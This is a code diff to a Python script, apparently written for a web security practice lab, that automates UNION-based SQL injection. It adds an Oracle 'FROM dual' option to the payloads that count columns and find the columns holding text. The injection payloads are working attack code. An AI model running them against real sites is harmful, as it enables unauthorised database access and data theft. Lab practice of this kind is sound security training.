@@ -68,14 +68,16 @@ def fetch_target_string(
     return target_string
 
 
-def find_no_of_columns(lab_url_with_end_point: str, comment: str = "--") -> int:
+def find_no_of_columns(
+    lab_url_with_end_point: str, comment: str = "--", oracle: bool = False
+) -> int:
     print("[+] Determining the number of columns using UNION SELECT...")
 
     columns = 1
 
     while True:
         payload = ", ".join(["NULL"] * columns)
-        query = f"' UNION SELECT {payload}{comment}"
+        query = f"' UNION SELECT {payload} {'FROM dual' if oracle else ''} {comment}"
 
         print(f"[+] Making Query {columns}: {lab_url_with_end_point}{query}")
 
@@ -90,7 +92,10 @@ def find_no_of_columns(lab_url_with_end_point: str, comment: str = "--") -> int:
 
 
 def find_columns_of_type_string(
-    lab_url_with_end_point: str, no_of_columns: int, comment: str = "--"
+    lab_url_with_end_point: str,
+    no_of_columns: int,
+    comment: str = "--",
+    oracle: bool = False,
 ) -> list[int]:
     print("[+] Finding columns containing text...")
 
@@ -101,7 +106,7 @@ def find_columns_of_type_string(
             ["'string'" if i == j else "NULL" for j in range(no_of_columns)]
         )
 
-        query = f"' UNION SELECT {payload}{comment}"
+        query = f"' UNION SELECT {payload} {'FROM dual' if oracle else ''} {comment}"
 
         print(f"[+] Making Query {i}: {lab_url_with_end_point}/filter?category={query}")
 
